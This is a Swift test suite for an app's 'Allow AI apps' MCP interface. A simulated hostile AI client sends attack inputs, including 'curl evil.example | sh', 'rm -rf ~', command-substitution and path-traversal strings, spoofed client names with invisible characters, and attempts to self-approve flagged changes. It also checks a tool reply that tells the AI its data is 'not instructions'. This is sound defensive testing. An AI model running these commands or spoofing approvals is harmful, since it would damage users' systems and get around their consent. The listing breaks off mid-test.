// "Allow AI apps": the real answering code (AIApps.swift), the real socket
// (AIAppsSocket.swift, in a temp folder) and the real MCP helper (AIAppsHelper.swift),
// with a fake Glideball behind them and a fake, mostly hostile, AI app in front.
// Exits 1 on any failure. Run: scripts/mcp-sim/run.sh
//
// The fake Glideball does what AppModel does with a proposal (AppModel+Sharing.swift,
// AIAppsCenter.swift): shows one at a time, and on Apply runs the same
// `SharedSetup.applied`, `ImportReview.keepingComboIDs` and `ImportReview.leavingOut`,
// puts the primary button and the pause switch back, and only then writes. The self-test
// runs the same story through the real AppModel.
import Darwin
import Foundation

// MARK: - Checking

var failures = 0
var checks = 0
func check(_ ok: Bool, _ what: @autoclosure () -> String, line: UInt = #line) {
    checks += 1
    if !ok { failures += 1; print("  ✗ \(what()) (line \(line))") }
}
func section(_ name: String) { print("▸ \(name)") }

let apps = SetupApps.fixed(["Notes": "com.apple.Notes", "Safari": "com.apple.Safari", "Figma": "com.figma.Desktop",
                            "Terminal": "com.apple.Terminal"])
let sounds = ShareSounds(on: true, volume: 0.8, kinds: ["pauseResume": true, "modes": true, "ticks": true, "milestones": true, "buttons": true])

/// A setup with a bit of everything, like a real one.
func sampleConfig() -> GlideConfig {
    var c = GlideConfig()
    c.trackingSpeed = 6.5
    c.scrollMode = .follow
    c.buttons = [1: .rightClick, 2: .shortcut(.copy), 3: .gesture(.standard)]
    c.chords = [Chord(buttons: [2, 3], action: .shortcut(.missionControl))]
    var safari = AppProfile(bundleID: "com.apple.Safari", name: "Safari")
    safari.trackingSpeed = 3
    safari.buttons = [2: .back, 3: .forward]
    c.appProfiles = [safari]
    return c
}

// MARK: - A fake Glideball

final class FakeApp: AIAppsHost {
    var config = sampleConfig() { didSet { writes += 1 } }
    /// Every time the settings were written.
    var writes = 0
    var showing: (reading: SetupCode.Reading, id: String, client: String)?
    /// A sheet, the tour or another preview is up: nothing else may show.
    var inTheWay = false
    var presented = 0
    var withdrawn: [String] = []
    var turnedOff = 0
    var setupsRead = 0
    var service: AIAppsService!

    func setupForAI() -> String {
        setupsRead += 1
        return AIReference.forAIApp(setup: SetupCode.write(config, look: nil, sounds: sounds, apps: apps).lines,
                                    device: .expertMouse, showApps: true, version: "sim")
    }

    var codeContext: SetupCode.Context { SetupCode.Context(current: config, sounds: sounds, lookIsCustom: false, apps: apps) }

    func changes(_ reading: SetupCode.Reading) -> [ImportChange] {
        var out = ImportReview.changes(from: config, to: reading.share.applied(to: config))
        if let s = reading.share.appliedSounds() { out += ImportReview.soundChanges(from: sounds, to: s, titles: [:]) }
        return out
    }

    func review(_ reading: SetupCode.Reading) -> (changes: Int, flagged: Int) {
        let c = changes(reading)
        return (c.count, c.flatMap(\.risks).filter { $0.tier == .destructive }.count)
    }

    func present(_ reading: SetupCode.Reading, proposal: String, client: String) -> Bool {
        guard showing == nil, !inTheWay else { return false }
        showing = (reading, proposal, client)
        presented += 1
        return true
    }

    func withdraw(proposal: String) {
        withdrawn.append(proposal)
        if showing?.id == proposal { showing = nil }
    }

    func turnedItselfOff() { turnedOff += 1 }

    // The person.

    /// Clicks Apply. `tick`: the red flags they ticked (nil: every one). Returns whether anything was written.
    @discardableResult
    func personApplies(ticking tick: Set<String>? = []) -> Bool {
        guard let s = showing else { return false }
        showing = nil
        service.tick()
        guard service.gate.isOpen, service.openProposal == s.id else { return false }   // AIAppsCenter.isWaiting
        let confirmed = tick ?? Set(changes(s.reading).flatMap(\.risks).map(\.id))
        var updated = ImportReview.leavingOut(from: config, in: ImportReview.keepingComboIDs(from: config, in: s.reading.share.applied(to: config)),
                                              confirmed: confirmed)
        updated.enabled = config.enabled
        updated.buttons[0] = config.buttons[0]
        guard updated != config else {
            service.resolved(proposal: s.id, applied: nil)
            return false
        }
        config = updated
        service.resolved(proposal: s.id, applied: s.reading.share.parts.map(\.id))
        return true
    }

    func personCancels() {
        guard let s = showing else { return }
        showing = nil
        service.resolved(proposal: s.id, applied: nil)
    }
}

/// A fake Glideball with its switch, its clock and the real answering code.
final class Rig {
    let app = FakeApp()
    var clock = 5_000.0
    lazy var gate = AIAppsGate(now: { [unowned self] in self.clock })
    lazy var service: AIAppsService = {
        let s = AIAppsService(host: app, gate: gate, now: { [unowned self] in self.clock })
        app.service = s
        return s
    }()

    init(on: Bool = true) {
        _ = service
        if on { gate.open() }
    }

    func frame(_ tool: String, _ arguments: [String: Any] = [:], client: String = "Sim") -> Data {
        AIAppsRequest.frame(tool: tool, client: client, arguments: arguments)!
    }

    func call(_ tool: String, _ arguments: [String: Any] = [:], client: String = "Sim") -> AIAppsReply {
        service.answer(frame(tool, arguments, client: client))
    }

    /// propose_changes with a setup code written as JSON text.
    func propose(_ code: String, client: String = "Sim") -> (reply: AIAppsReply, json: [String: Any]) {
        let setup = (try? JSONSerialization.jsonObject(with: Data(code.utf8))) ?? code
        let r = call("propose_changes", ["setup": setup], client: client)
        return (r, json(r))
    }

    func status(_ id: String) -> String { json(call("check_proposal", ["id": id]))["status"] as? String ?? "?" }
}

func json(_ reply: AIAppsReply) -> [String: Any] {
    ((try? JSONSerialization.jsonObject(with: Data(reply.text.utf8))) as? [String: Any]) ?? [:]
}

func code(_ body: String) -> String { #"{"format": "glideball-ai-setup", "version": 1, "# + body + "}" }

/// Nothing a reply holds may carry control or invisible characters (a newline between lines aside).
func isClean(_ text: String) -> Bool {
    !text.unicodeScalars.contains { u in
        u != "\n" && (u.properties.generalCategory == .control || u.properties.generalCategory == .format || (0x2028...0x2029).contains(u.value))
    }
}

// MARK: - The tool list

section("The tool list is exactly the planned three")
let planned = ["get_setup", "propose_changes", "check_proposal"]
check(AIAppsTool.names == planned, "the tools are \(AIAppsTool.names), not \(planned)")
check(AIAppsStdio.tools.compactMap { $0["name"] as? String } == planned, "tools/list offers \(AIAppsStdio.tools.compactMap { $0["name"] as? String })")
for tool in AIAppsTool.allCases {
    check(tool.inputSchema["additionalProperties"] as? Bool == false, "\(tool.rawValue)'s arguments are open-ended")
    check(tool.about.count > 40 && tool.about.unicodeScalars.allSatisfy(\.isASCII), "\(tool.rawValue) has no plain description")
}
check(AIAppsTool.proposeChanges.about.contains("only after the person approves them in Glideball"), "propose_changes doesn't say the person approves in Glideball")
check((AIAppsTool.proposeChanges.inputSchema["properties"] as? [String: Any])?.keys.sorted() == ["setup"], "propose_changes takes more than a setup code")
do {
    // Nothing that sounds like doing, in any spelling, is a tool.
    let rig = Rig()
    for name in ["apply", "apply_changes", "apply_without_review", "undo", "pause", "resume", "run", "exec", "shell", "open", "read_file",
                 "get_stats", "set_setup", "GET_SETUP", "get_setup ", " get_setup", "get-setup", "getSetup", "propose_changes\u{0}", "", "tools/call"] {
        let r = rig.service.answer(Data(#"{"v":1,"tool":\#(SetupJSON.quote(name)),"client":"x","arguments":{}}"#.utf8))
        check(!r.ok && r.text == AIAppsText.noSuchTool, "a tool called \(name.debugDescription) wasn't refused: \(r.text.prefix(60))")
        rig.clock += 1
    }
    check(rig.app.setupsRead == 0 && rig.app.presented == 0 && rig.app.writes == 0, "an unknown tool reached Glideball")
}

// MARK: - The switch off

section("With the switch off, everything refuses")
do {
    let rig = Rig(on: false)
    let good = code(#""trackingSpeed": 9"#)
    var asked: [Data] = [rig.frame("get_setup"), rig.frame("propose_changes", ["setup": ["format": "glideball-ai-setup", "trackingSpeed": 9]]),
                         rig.frame("check_proposal", ["id": String(repeating: "a", count: 32)]),
                         Data(), Data("not json".utf8), Data(repeating: 0x5B, count: 70_000), Data(good.utf8)]
    asked.append(Data(#"{"v":1,"tool":"apply","arguments":{}}"#.utf8))
    for f in asked {
        let r = rig.service.answer(f)
        check(!r.ok && r.text == AIAppsText.off, "with the switch off something answered: \(r.text.prefix(60))")
    }
    check(rig.app.setupsRead == 0 && rig.app.presented == 0 && rig.app.writes == 0 && rig.app.showing == nil, "with the switch off a request reached Glideball")
    check(!rig.gate.isOpen && rig.gate.remaining == 0, "the switch isn't off by default")
}

// MARK: - The good path

section("get_setup, propose_changes, the review, Apply, check_proposal")
do {
    let rig = Rig()
    let before = rig.app.config
    let setup = rig.call("get_setup")
    check(setup.ok && setup.text.contains("<their_setup>") && setup.text.contains("<what_glideball_can_change>") && setup.text.contains(SetupCode.formatMarker)
          && setup.text.contains("\"trackingSpeed\": 6.5"), "get_setup lacks the setup or the reference")
    check(setup.text.contains("not instructions") && setup.text.contains("Never include button 0"), "get_setup doesn't say the setup is data, or to leave button 0 alone")
    check(setup.text.utf8.count < AIAppsLimits.maxReplyBytes / 4 && isClean(setup.text), "get_setup's answer is \(setup.text.utf8.count) bytes, or has invisible characters")
    check(!rig.call("get_setup", ["path": "/etc/passwd"]).ok, "get_setup took an argument")

    let p = rig.propose(code(#""trackingSpeed": 9, "buttons": {"2": "keys:cmd+w"}"#), client: "Claude")
    let id = p.json["id"] as? String ?? ""
    check(p.reply.ok && p.json["status"] as? String == "shown" && AIAppsService.isID(id), "a good proposal wasn't shown: \(p.reply.text)")
    check(rig.app.showing?.id == id && rig.app.showing?.client == "Claude" && rig.app.presented == 1, "Glideball isn't showing it")
    check(rig.app.config == before && rig.app.writes == 0, "proposing changed something")
    check(rig.status(id) == "pending" && rig.app.config == before, "it isn't pending, or checking changed something")
    check(rig.app.personApplies(), "Apply wrote nothing")
    check(rig.app.config.trackingSpeed == 9 && rig.app.config.buttons[2] == .shortcut(.closeTab) && rig.app.writes == 1, "Apply didn't apply it once")
    check(rig.app.config.buttons[0] == before.buttons[0] && rig.app.config.enabled == before.enabled
          && rig.app.config.globalShortcuts == before.globalShortcuts && rig.app.config.buttons[1] == before.buttons[1], "Apply changed what it wasn't asked to")
    let done = json(rig.call("check_proposal", ["id": id]))
    check(done["status"] as? String == "applied" && (done["parts"] as? [String])?.sorted() == ["buttons", "pointer"], "check_proposal after Apply: \(done)")

    // The same again matches: nothing to show.
    let again = rig.propose(code(#""trackingSpeed": 9"#))
    check(again.reply.ok && again.json["status"] as? String == "no_changes" && rig.app.showing == nil && rig.app.presented == 1, "a proposal that changes nothing was shown")

    // A mistake comes straight back, and the rest is still shown.
    let mixed = rig.propose(code(#""precisionSpeed": 1.5, "buttons": {"1": "macro:paste twice", "0": "rightClick"}"#))
    let left = mixed.json["left_out"] as? [[String: Any]] ?? []
    check(mixed.json["status"] as? String == "shown" && left.count == 2 && left.contains { ($0["at"] as? String) == "buttons.0" },
          "what was left out didn't come back: \(mixed.reply.text)")
    check(left.allSatisfy { Set($0.keys) == ["at", "said", "fix"] } && isClean(mixed.reply.text), "the left-out notes aren't fixed keys and clean text")
    rig.app.personCancels()

    // A code that can't be read at all.
    rig.clock += 2
    for (bad, why) in [("{\"format\": \"glideball-ai-setup\", \"version\": 1, \"buttons\": {\"1\": \"macro:x\"}}", "nothing usable"),
                       ("{\"format\": \"glideball-ai-setup\", \"version\": 7, \"trackingSpeed\": 3}", "a newer version"),
                       ("{\"hello\": 1}", "not a setup")] {
        let r = rig.propose(bad)
        check(!r.reply.ok && r.json["status"] as? String == "refused" && (r.json["problem"] as? String)?.isEmpty == false && rig.app.showing == nil,
              "\(why) wasn't refused with a reason: \(r.reply.text.prefix(80))")
    }
    // A shared setup's own file (it can carry a sender's name) and a whole settings file aren't setup codes.
    let share = SharedSetup.make([.pointer], from: GlideConfig(), look: nil, sounds: nil, name: "Mallory")!
    let shareText = String(decoding: try! share.fileData(), as: UTF8.self)
    let asShare = rig.propose(shareText)
    check(!asShare.reply.ok && asShare.json["problem"] as? String == AIAppsText.notACode && rig.app.showing == nil, "a share file was taken as a proposal")
    let asFile = rig.propose(#"{"format": "glideball-settings", "version": 1, "config": {"trackingSpeed": 40, "enabled": false}}"#)
    check(!asFile.reply.ok && rig.app.showing == nil, "a settings file was taken as a proposal")
}

// MARK: - Cancel, expiry, the window

section("Nothing is written when a proposal is cancelled, expires or outlives the switch")
do {
    let rig = Rig()
    let before = rig.app.config
    var id = rig.propose(code(#""trackingSpeed": 12"#)).json["id"] as? String ?? ""
    rig.app.personCancels()
    check(rig.status(id) == "declined" && rig.app.config == before && rig.app.writes == 0, "Cancel wrote something, or isn't declined")

    // One at a time.
    rig.clock += 2
    id = rig.propose(code(#""trackingSpeed": 12"#)).json["id"] as? String ?? ""
    let second = rig.propose(code(#""trackingSpeed": 20"#))
    check(!second.reply.ok && second.json["status"] as? String == "busy" && second.json["id"] == nil && rig.app.presented == 2, "a second proposal was shown over the first")

    // Five minutes: taken down, and Apply on a sheet that somehow stayed does nothing.
    let stale = rig.app.showing
    rig.clock += AIAppsLimits.proposalLife - 1
    check(rig.status(id) == "pending", "it expired early")
    rig.clock += 1
    check(rig.status(id) == "expired" && rig.app.withdrawn == [id] && rig.app.showing == nil, "it didn't expire after five minutes")
    rig.app.showing = stale
    check(!rig.app.personApplies() && rig.app.config == before && rig.app.writes == 0, "an expired proposal was applied")

    // The window ends with a proposal up (shown a minute before the 15 are over).
    rig.clock += rig.gate.remaining - 60
    id = rig.propose(code(#""trackingSpeed": 12"#)).json["id"] as? String ?? ""
    check(AIAppsService.isID(id) && rig.app.showing != nil, "couldn't propose again after an expiry")
    let waiting = rig.app.showing
    rig.clock += 59
    check(rig.gate.isOpen && rig.status(id) == "pending", "the window ended early")
    rig.clock += 1
    check(!rig.gate.isOpen, "the window didn't end after 15 minutes")
    rig.service.tick()   // the app's once-a-second timer
    check(rig.app.showing == nil && rig.app.withdrawn.last == id, "the proposal outlived the window")
    rig.app.showing = waiting
    check(!rig.app.personApplies() && rig.app.config == before && rig.app.writes == 0, "a proposal was applied after the window ended")
    for (tool, args) in [("get_setup", [:]), ("check_proposal", ["id": id]), ("propose_changes", ["setup": ["trackingSpeed": 3]])] as [(String, [String: Any])] {
        let r = rig.call(tool, args)
        check(!r.ok && r.text == AIAppsText.off, "\(tool) answered after the window ended")
    }
    check(rig.app.config == before && rig.app.writes == 0, "something was written")

    // Turned on again: a fresh 15 minutes, the old proposal still expired.
    rig.gate.open()
    check(rig.gate.remaining == AIAppsLimits.window && rig.status(id) == "expired", "turning it on again isn't a fresh window")
    // The person turns it off with a proposal up.
    id = rig.propose(code(#""trackingSpeed": 12"#)).json["id"] as? String ?? ""
    rig.service.closeGate()
    check(rig.app.showing == nil && rig.app.withdrawn.last == id && !rig.gate.isOpen && rig.app.config == before, "turning it off left the proposal up")
    // A clock that jumps (backwards, or far ahead) is as good as off.
    rig.gate.open()
    rig.clock -= 10
    check(!rig.gate.isOpen, "a clock that went backwards kept the switch on")
    rig.gate.open()
    rig.clock += 1e9
    check(!rig.gate.isOpen, "a clock that jumped ahead kept the switch on")
}

section("Glideball busy, and three in a row turned down")
do {
    let rig = Rig()
    rig.app.inTheWay = true
    let r = rig.propose(code(#""trackingSpeed": 12"#))
    check(!r.reply.ok && r.json["status"] as? String == "busy" && r.json["next"] as? String == AIAppsText.inTheWay && rig.service.openProposal == nil,
          "a proposal that couldn't show is waiting anyway")
    rig.app.inTheWay = false
    for round in 1...3 {
        rig.clock += 2
        let id = rig.propose(code(#""trackingSpeed": \#(10 + round)"#)).json["id"] as? String ?? ""
        check(AIAppsService.isID(id), "round \(round) wasn't shown")
        rig.app.personCancels()
    }
    check(!rig.gate.isOpen && rig.app.turnedOff == 1 && rig.app.writes == 0, "three declines in a row didn't turn the switch off")
    check(rig.call("get_setup").text == AIAppsText.off, "it still answers after turning itself off")
    // An Apply in between starts the count again.
    let rig2 = Rig()
    for round in 1...5 {
        rig2.clock += 2
        _ = rig2.propose(code(#""trackingSpeed": \#(10 + round)"#))
        if round == 3 { rig2.app.personApplies() } else { rig2.app.personCancels() }
    }
    check(rig2.gate.isOpen && rig2.app.turnedOff == 0, "an Apply didn't reset the count of declines")

    // Only the person saying no counts. A proposal that ran out of time isn't a no...
    let rig3 = Rig()
    for round in 1...4 {
        rig3.gate.open()   // (four times five minutes is more than the fifteen)
        rig3.clock += 2
        let id = rig3.propose(code(#""trackingSpeed": \#(10 + round)"#)).json["id"] as? String ?? ""
        rig3.clock += AIAppsLimits.proposalLife
        rig3.service.tick()
        check(rig3.status(id) == "expired" && rig3.app.showing == nil, "round \(round) didn't run out of time")
    }
    check(rig3.gate.isOpen && rig3.app.turnedOff == 0 && rig3.app.withdrawn.count == 4, "proposals that ran out of time turned the switch off")
    // ...and it doesn't start the count again either: no, no, out of time, no.
    let rig4 = Rig()
    for round in 1...4 {
        rig4.clock += 2
        _ = rig4.propose(code(#""trackingSpeed": \#(10 + round)"#))
        if round == 3 {
            rig4.clock += AIAppsLimits.proposalLife
            rig4.service.tick()
            check(rig4.gate.isOpen && rig4.app.showing == nil && rig4.app.turnedOff == 0, "two declines and one out of time turned the switch off")
        } else {
            rig4.app.personCancels()
        }
    }
    check(!rig4.gate.isOpen && rig4.app.turnedOff == 1, "a third decline after one ran out of time didn't turn the switch off")
    // Neither is one that went because the switch did: no, no, switched off with one up, on again, no, no.
    let rig5 = Rig()
    for round in 1...5 {
        rig5.clock += 2
        _ = rig5.propose(code(#""trackingSpeed": \#(10 + round)"#))
        if round == 3 {
            rig5.service.closeGate()
            check(rig5.app.showing == nil && rig5.app.turnedOff == 0, "switching it off with a proposal up counted as a decline")
            rig5.gate.open()
        } else {
            rig5.app.personCancels()
        }
    }
    check(rig5.gate.isOpen && rig5.app.turnedOff == 0 && rig5.app.presented == 5, "a proposal taken down with the switch counted toward the three")
    rig5.clock += 2
    _ = rig5.propose(code(#""trackingSpeed": 19"#))
    rig5.app.personCancels()
    check(!rig5.gate.isOpen && rig5.app.turnedOff == 1, "three declines after switching it on again didn't turn it off")
}

// MARK: - Destructive shortcuts and the primary button

section("A destructive shortcut is never applied without the person's tick")
do {
    let risky = [#""buttons": {"2": "keys:cmd+q"}"#, #""buttons": {"1": "keys:cmd+shift+delete", "2": "holdKeys:cmd+opt+shift+escape"}"#,
                 #""combos": [{"buttons": [1, 2], "action": "keys:cmd+opt+shift+q"}]"#,
                 #""apps": [{"app": "Figma", "buttons": {"3": {"gesture": {"up": "keys:cmd+c", "right": {"more": {"upRight": "keys:cmd+opt+shift+delete"}}}}}}]"#,
                 #""buttons": {"3": {"gesture": {"up": "keys:cmd+delete", "tap": "keys:cmd+q"}}}"#]
    for body in risky {
        let rig = Rig()
        let before = rig.app.config
        let p = rig.propose(code(body + #", "trackingSpeed": 9"#))
        let flagged = p.json["flagged_shortcuts"] as? Int ?? 0
        check(p.json["status"] as? String == "shown" && flagged >= 1 && p.json["about_flagged"] as? String == AIAppsText.flagged, "a destructive shortcut wasn't flagged to the AI: \(body)")
        let shown = rig.app.showing
        rig.app.personApplies()   // Apply with nothing ticked
        check(rig.app.config.trackingSpeed == 9, "the rest of the proposal wasn't applied: \(body)")
        check(ImportReview.flagged(from: before, to: rig.app.config).flatMap(\.risks).allSatisfy { $0.tier != .destructive },
              "an unticked destructive shortcut was applied: \(body)")
        check(rig.app.config.buttons[0] == before.buttons[0], "button 0 changed")
        // The tick is what lets it through, and only the tick.
        let rig2 = Rig()
        _ = rig2.propose(code(body + #", "trackingSpeed": 9"#))
        rig2.app.personApplies(ticking: nil)
        check(!ImportReview.flagged(from: before, to: rig2.app.config).flatMap(\.risks).filter { $0.tier == .destructive }.isEmpty,
              "ticking the flag didn't apply it (so the check above proves nothing): \(body)")
        _ = shown
    }
}

section("Button 0, the pause switch and Glideball's own shortcuts never change")
do {
    let tries = [#""buttons": {"0": "rightClick"}"#, #""buttons": {"0": "disabled", "1": "back"}"#, #""buttons": {"00": "keys:cmd+q", "0.0": "back", "-0": "back"}"#,
                 #""apps": [{"app": "Safari", "buttons": {"0": "middleClick", "1": "forward"}}]"#,
                 #""combos": [{"buttons": [0, 1], "action": {"gesture": {"up": "back"}}}]"#,
                 #""enabled": false, "paused": true, "trackingSpeed": 3"#,
                 #""globalShortcuts": {"pause": "keys:cmd+p"}, "displaySpeeds": {"enabled": true}, "trackingSpeed": 3"#,
                 #""config": {"buttons": {"0": "rightClick"}}, "trackingSpeed": 3"#]
    for body in tries {
        let rig = Rig()
        let before = rig.app.config
        _ = rig.propose(code(body))
        // What the code itself would give, before the app puts the primary button back as it always does.
        if let shown = rig.app.showing {
            let raw = shown.reading.share.applied(to: before)
            check(raw.buttons[0] == before.buttons[0] && raw.enabled == before.enabled && raw.globalShortcuts == before.globalShortcuts,
                  "the code's own share would change button 0 or the pause switch: \(body)")
            check(raw.chords.allSatisfy { !$0.buttons.contains(0) || !$0.action.isGesture }, "a gesture combo holds the primary button: \(body)")
        }
        rig.app.personApplies(ticking: nil)
        check(rig.app.config.buttons[0] == before.buttons[0], "button 0 changed: \(body)")
        check(rig.app.config.enabled == before.enabled && rig.app.config.globalShortcuts == before.globalShortcuts
              && rig.app.config.displaySpeeds == before.displaySpeeds, "the pause switch, Glideball's shortcuts or display speeds changed: \(body)")
        check(rig.app.config.appProfiles.allSatisfy { $0.buttons?[0] == nil }, "an app setup got a button 0: \(body)")
    }
    // A primary button the person somehow has set stays what it is.
    let rig = Rig()
    rig.app.config.buttons[0] = .leftClick
    rig.app.writes = 0
    _ = rig.propose(code(#""buttons": {"0": "rightClick", "1": "back"}"#))
    rig.app.personApplies(ticking: nil)
    check(rig.app.config.buttons[0] == .leftClick && rig.app.config.buttons[1] == .back, "the primary button was touched")
}

// MARK: - Hostile requests

section("Malformed, oversized and deeply nested requests")
do {
    let rig = Rig()
    let before = rig.app.config
    func refused(_ data: Data, _ what: String, line: UInt = #line) {
        rig.clock += 1
        let r = rig.service.answer(data)
        check(!r.ok, "\(what) wasn't refused: \(r.text.prefix(80))", line: line)
        check(rig.app.showing == nil && rig.app.config == before && rig.app.writes == 0, "\(what) reached the settings", line: line)
        check(isClean(r.text) && r.text.utf8.count < 4_000, "\(what): the refusal isn't short, clean text", line: line)
    }
    func refusedText(_ s: String, _ what: String, line: UInt = #line) { refused(Data(s.utf8), what, line: line) }

    refused(Data(), "an empty request")
    refusedText("null", "null")
    refusedText("[]", "an array")
    refusedText("\"get_setup\"", "a bare string")
    refusedText("{", "half an object")
    refusedText(#"{"v":1,"tool":"get_setup""#, "a request cut off")
    refused(Data([0xFF, 0xFE, 0x00, 0x7B]), "invalid UTF-8")
    refused(Data(repeating: 0, count: 100), "NUL bytes")
    refusedText(#"{"tool":"get_setup"}"#, "no version")
    refusedText(#"{"v":2,"tool":"get_setup"}"#, "another version")
    refusedText(#"{"v":true,"tool":"get_setup"}"#, "a version that's true")
    refusedText(#"{"v":"1","tool":"get_setup"}"#, "a version that's text")
    refusedText(#"{"v":1,"tool":["get_setup"]}"#, "a tool that's a list")
    refusedText(#"{"v":1,"tool":"get_setup","arguments":[]}"#, "arguments that are a list")
    refusedText(#"{"v":1,"tool":"get_setup","arguments":"x"}"#, "arguments that are text")
    refusedText(#"{"v":1,"tool":"get_setup","extra":1}"#, "an extra field")
    refusedText(#"{"v":1,"tool":"get_setup","arguments":{"x":1}}"#, "get_setup with an argument")
    refusedText(#"{"v":1,"tool":"propose_changes"}"#, "propose_changes with nothing")
    refusedText(#"{"v":1,"tool":"propose_changes","arguments":{"setup":null}}"#, "a null setup")
    refusedText(#"{"v":1,"tool":"propose_changes","arguments":{"setup":[1,2]}}"#, "a setup that's a list")
    refusedText(#"{"v":1,"tool":"propose_changes","arguments":{"setup":42}}"#, "a setup that's a number")
    refusedText(#"{"v":1,"tool":"propose_changes","arguments":{"setup":{"trackingSpeed":9},"summary":"just a tweak"}}"#, "a summary beside the setup")
    refusedText(#"{"v":1,"tool":"propose_changes","arguments":{"setup":{"trackingSpeed":9},"apply":true}}"#, "apply: true beside the setup")
    refusedText(#"{"v":1,"tool":"propose_changes","arguments":{"setup":{"trackingSpeed":9},"confirmed":["buttons.2"]}}"#, "the AI ticking its own flags")
    refusedText(#"{"v":1,"tool":"check_proposal","arguments":{}}"#, "check_proposal with no id")
    for id in ["", "abc", String(repeating: "g", count: 32), String(repeating: "A", count: 32), String(repeating: "a", count: 33),
               "../../../../etc/passwd", String(repeating: "a", count: 31) + "\n", String(repeating: "a", count: 100_000)] {
        refused(AIAppsRequest.frame(tool: "check_proposal", client: "Sim", arguments: ["id": id]) ?? Data(#"{"v":1,"tool":"check_proposal","arguments":{"id":"\#(id)"}}"#.utf8),
                "a proposal id of \(id.prefix(20).debugDescription)")
    }
    refusedText(#"{"v":1,"tool":"check_proposal","arguments":{"id":12345678901234567890123456789012}}"#, "an id that's a number")
    refused(rig.frame("check_proposal", ["id": String(repeating: "0", count: 32)]), "an id nobody was given")

    // Size and depth: refused by the service whatever let them through.
    var big = Data(#"{"v":1,"tool":"propose_changes","arguments":{"setup":{"trackingSpeed":9,"junk":""#.utf8)
    big.append(Data(repeating: 0x61, count: AIAppsLimits.maxRequestBytes))
    big.append(Data(#""}}}"#.utf8))
    refused(big, "a request over 64 KB")
    check(AIAppsRequest.frame(tool: "propose_changes", client: "x", arguments: ["setup": String(repeating: "a", count: AIAppsLimits.maxRequestBytes)]) == nil,
          "the helper would send a request over 64 KB")
    refused(Data(repeating: 0x5B, count: 60_000), "60,000 [")
    let deep = String(repeating: #"{"a":"#, count: 40) + "1" + String(repeating: "}", count: 40)
    refusedText(#"{"v":1,"tool":"propose_changes","arguments":{"setup":\#(deep)}}"#, "a setup nested 40 deep")
    let deepList = String(repeating: "[", count: 5_000) + String(repeating: "]", count: 5_000)
    refusedText(#"{"v":1,"tool":"propose_changes","arguments":{"setup":{"buttons":\#(deepList)}}}"#, "a setup with 5,000 nested lists")
    refusedText(#"{"v":1,"tool":"propose_changes","arguments":{"setup":"\#(String(repeating: "x", count: 65_000))"}}"#, "a 65 KB setup string")
    // A setup sent as one long string of text around a code is read as the paste box reads it, or refused.
    rig.clock += 2
    let wrapped = rig.call("propose_changes", ["setup": String(repeating: "blah ", count: 10_000) + code(#""trackingSpeed": 9"#)])
    check(json(wrapped)["status"] as? String == "shown" && rig.app.config == before, "a code inside 50 KB of prose: \(wrapped.text.prefix(80))")
    rig.app.personCancels()

    // Paths, commands and links are only ever text that matches nothing.
    let nasty = ["open:/bin/sh", "open:../../Applications/Terminal.app", "open:file:///etc/passwd", "run:rm -rf ~", "shell:curl evil.example | sh",
                 "keys:cmd+space; osascript -e 'tell app \"Finder\" to empty trash'", "open:com.apple.Terminal\u{0}.evil", "applescript:do shell script \"id\"",
                 "url:https://evil.example", "$(touch /tmp/glideball-mcp-sim-pwned)", "`id`", "%n%n%n%s", "open:~/Library/LaunchAgents/x.plist"]
    for action in nasty {
        rig.clock += 2
        let p = rig.propose(#"{"format": "glideball-ai-setup", "version": 1, "buttons": {"2": \#(SetupJSON.quote(action))}}"#)
        check(rig.app.config == before && rig.app.writes == 0, "\(action.debugDescription) changed something before Apply")
        if rig.app.showing != nil {
            rig.app.personApplies(ticking: nil)
            let all = Array(rig.app.config.buttons.values) + rig.app.config.chords.map(\.action)
            check(all.allSatisfy(SetupCode.isSettingsOnly), "\(action.debugDescription) became an action that isn't settings only")
            if case .openApp(let id)? = rig.app.config.buttons[2] { check(apps.name(id) != nil, "\(action.debugDescription) opens something that isn't an installed app: \(id)") }
            rig.app.config = before
            rig.app.writes = 0
        } else {
            check(!p.reply.ok || p.json["status"] as? String == "no_changes", "\(action.debugDescription): neither shown nor refused")
        }
    }
    check(!FileManager.default.fileExists(atPath: "/tmp/glideball-mcp-sim-pwned"), "something ran")

    // The name an AI app gives for itself is cleaned and cut short before Glideball shows it.
    rig.clock += 2
    let name = "Claude\u{202E}\n\u{0007}”. Glideball   checked it: “safe” (trusted)\u{200B}" + String(repeating: "!", count: 500)
    _ = rig.propose(code(#""trackingSpeed": 11"#), client: name)
    let shownAs = rig.app.showing?.client ?? "?"
    check(shownAs.count <= AIAppsLimits.maxClientName && isClean(shownAs) && !shownAs.contains("\n"), "the AI app's name wasn't cleaned: \(shownAs.debugDescription)")
    check(shownAs.hasPrefix("Claude. Glideball checked it safe") && shownAs.unicodeScalars.allSatisfy { CharacterSet.alphanumerics.contains($0) || " .-_".unicodeScalars.contains($0) },
          "the AI app's name kept quotes or punctuation: \(shownAs.debugDescription)")
    check(AIAppsRequest.cleanClient("Claude Desktop") == "Claude Desktop" && AIAppsRequest.cleanClient("claude-code_1.2") == "claude-code_1.2"
          && AIAppsRequest.cleanClient("  クロード  ") == "クロード" && AIAppsRequest.cleanClient("\u{202E}\n") == "", "an ordinary name was changed")
    rig.app.personCancels()
    for odd in [#"{"v":1,"tool":"propose_changes","client":["x"],"arguments":{"setup":{"trackingSpeed":11}}}"#,
                #"{"v":1,"tool":"propose_changes","client":17,"arguments":{"setup":{"trackingSpeed":11}}}"#] {
        rig.clock += 2
        _ = rig.service.answer(Data(odd.utf8))
        check(rig.app.showing?.client == "", "a name that isn't text was shown as \(rig.app.showing?.client.debugDescription ?? "nothing")")
        rig.app.personCancels()
        rig.gate.open()   // (three declines would turn it off)
    }
}

section("Flooding")
do {
    let rig = Rig()
    var answered = 0, limited = 0
    for _ in 0..<1_000 {
        let r = rig.call("get_setup")
        if r.ok { answered += 1 } else if r.text == AIAppsText.tooFast { limited += 1 }
    }
    check(answered == Int(AIAppsLimits.perSecond) && limited == 1_000 - answered, "1,000 at once: \(answered) answered, \(limited) refused")
    check(rig.app.setupsRead == answered, "a refused request still read the setup")
    rig.clock += 0.5
    answered = (0..<100).filter { _ in rig.call("get_setup").ok }.count
    check(answered == 10, "half a second later \(answered) more got through, not 10")
    // 1,000 proposals at once: one sheet, nothing written.
    rig.clock += 5
    var shown = 0
    for i in 0..<1_000 { if rig.propose(code(#""trackingSpeed": \#(5 + i % 20)"#)).json["status"] as? String == "shown" { shown += 1 } }
    check(shown == 1 && rig.app.presented == 1 && rig.app.writes == 0, "1,000 proposals: \(shown) shown, \(rig.app.writes) writes")
    // A minute of hammering at 200 a second with the person saying no: it turns itself off.
    rig.app.personCancels()
    var t = 0.0
